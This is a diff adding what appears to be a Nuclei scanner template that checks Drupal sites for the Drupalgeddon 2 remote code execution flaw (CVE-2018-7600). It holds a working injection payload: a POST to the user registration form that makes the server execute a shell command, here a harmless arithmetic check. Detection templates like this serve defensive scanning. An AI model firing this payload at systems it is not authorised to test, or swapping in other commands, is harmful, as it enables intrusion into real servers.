@@ -1,0 +1,41 @@
+id: drupalgeddon2-rce-cve-2018-7600
+
+info:
+  name: Drupal Drupalgeddon 2 Remote Code Execution (CVE-2018-7600)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2018-7600,drupal
+
+variables:
+  t1: '{{rand_int(111000, 999000)}}'
+  t2: '{{rand_int(10, 100)}}'
+  t3: '{{to_number(t1) - to_number(t2)}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=cmd.exe+/c+set+/a+{{t1}}+-+{{t2}}%26expr+{{t1}}+-+{{t2}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"method\":\"replaceWith\""
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
+    stop-at-first-match: true
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "\"method\":\"replaceWith\".*?{{t3}}"  # Extracts the specific part containing the calculated value.
